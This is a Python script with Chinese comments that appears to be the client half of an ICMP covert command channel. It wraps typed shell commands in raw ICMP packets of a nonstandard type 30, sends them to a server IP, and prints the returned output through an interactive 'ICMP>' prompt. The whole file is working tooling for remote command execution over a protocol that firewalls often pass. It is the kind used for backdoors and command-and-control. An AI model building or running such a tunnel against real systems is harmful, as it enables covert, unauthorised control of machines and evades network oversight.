#!/usr/bin/env python3
import os
import socket
import struct
import select
import time
import sys

class ICMPClient:
    def __init__(self, server_ip):
        self.server_ip = server_ip
        self.is_windows = sys.platform.startswith('win')
        print(f"运行在 {'Windows' if self.is_windows else 'Linux'} 系统上")
        
        try:
            # 创建原始套接字
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # 设置超时
            self.sock.settimeout(5)
            
            # 在Windows上，需要绑定到特定接口
            if self.is_windows:
                self.sock.bind(('0.0.0.0', 0))
                
            print("ICMP 套接字创建成功")
        except Exception as e:
            print(f"创建套接字时出错: {e}")
            print("请以管理员权限运行此脚本")
            exit(1)
        
        # 包ID和序列号
        self.packet_id = os.getpid() & 0xFFFF
        self.seq_number = 0
    
    def calculate_checksum(self, data):
        """计算ICMP校验和"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            checksum += w
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = ~checksum & 0xffff
        return checksum
    
    def create_icmp_packet(self, data):
        """创建ICMP请求包"""
        self.seq_number += 1
        # 使用自定义类型30而不是标准的Echo Request(8)
        header = struct.pack("!BBHHH", 30, 0, 0, self.packet_id, self.seq_number)
        checksum = self.calculate_checksum(header + data)
        header = struct.pack("!BBHHH", 30, 0, checksum, self.packet_id, self.seq_number)
        print(f"创建ICMP包: id={self.packet_id}, seq={self.seq_number}, data_len={len(data)}")
        return header + data
    
    def parse_icmp_packet(self, packet):
        """解析ICMP数据包"""
        try:
            # Windows raw sockets 接收包含IP头的完整数据包
            # Linux raw sockets 接收不包含IP头的ICMP数据
            if self.is_windows:
                # Windows: 总是包含IP头，跳过IP头
                if len(packet) < 20:
                    return 0, 0, 0, 0, 0, b''
                
                # 获取IP头长度 (IHL * 4)
                ip_header_len = (packet[0] & 0x0F) * 4
                if len(packet) < ip_header_len + 8:
                    return 0, 0, 0, 0, 0, b''
                
                icmp_header = packet[ip_header_len:ip_header_len+8]
                data = packet[ip_header_len+8:]
            else:
                # Linux: 不包含IP头
                if len(packet) < 8:
                    return 0, 0, 0, 0, 0, b''
                
                icmp_header = packet[:8]
                data = packet[8:]
            
            icmp_type, code, checksum, packet_id, seq = struct.unpack("!BBHHH", icmp_header)
            print(f"解析ICMP响应: type={icmp_type}, code={code}, id={packet_id}, seq={seq}, data_len={len(data)}")
            return icmp_type, code, checksum, packet_id, seq, data
        except Exception as e:
            print(f"解析数据包时出错: {e}")
            return 0, 0, 0, 0, 0, b''
    
    def send_command(self, command):
        """发送命令到服务器"""
        try:
            print(f"发送命令: {command}")
            packet = self.create_icmp_packet(command.encode())
            print(f"发送数据包到 {self.server_ip}")
            sent = self.sock.sendto(packet, (self.server_ip, 0))
            print(f"已发送 {sent} 字节，等待响应...")
            
            # 等待响应
            start_time = time.time()
            
            while time.time() - start_time < 10:  # 10秒超时
                try:
                    packet, addr = self.sock.recvfrom(1024)
                    print(f"收到来自 {addr} 的数据包，长度: {len(packet)}")
                    
                    # 解析ICMP包
                    icmp_type, code, checksum, packet_id, seq, data = self.parse_icmp_packet(packet)
                    
                    # 检查是否是我们发送的包的响应
                    # 服务器使用相同的自定义类型30进行回复
                    if icmp_type == 30 and packet_id == self.packet_id and seq == self.seq_number:
                        print("收到有效响应")
                        return data.decode('utf-8', errors='ignore')
                    else:
                        print(f"响应不匹配: 期望(type=30, id={self.packet_id}, seq={self.seq_number}), 实际(type={icmp_type}, id={packet_id}, seq={seq})")
                except socket.timeout:
                    print("接收超时，继续等待...")
                    continue
                except Exception as e:
                    print(f"接收响应时出错: {e}")
                    continue
            
            return "请求超时"
        except Exception as e:
            return f"发送命令时出错: {e}"
    
    def interactive_shell(self):
        """交互式命令shell"""
        print("ICMP命令客户端已启动。输入'exit'退出。")
        
        # 测试连接
        print("测试连接...")
        # 使用更可靠的测试命令
        response = self.send_command("echo test_connection_123")
        print(f"测试响应: {response}")
        
        if "test_connection_123" not in response:
            print("无法连接到服务器，请检查:")
            print("1. 服务器是否正在运行")
            print("2. 防火墙设置")
            print("3. 网络连通性")
            return
        
        while True:
            try:
                command = input("ICMP> ").strip()
                if not command:
                    continue
                
                if command.lower() == "exit":
                    break
                
                result = self.send_command(command)
                print(result)
            except KeyboardInterrupt:
                print("\n退出")
                break
            except Exception as e:
                print(f"错误: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python icmp_client_win.py <服务器IP>")
        exit(1)
    
    client = ICMPClient(sys.argv[1])
    client.interactive_shell()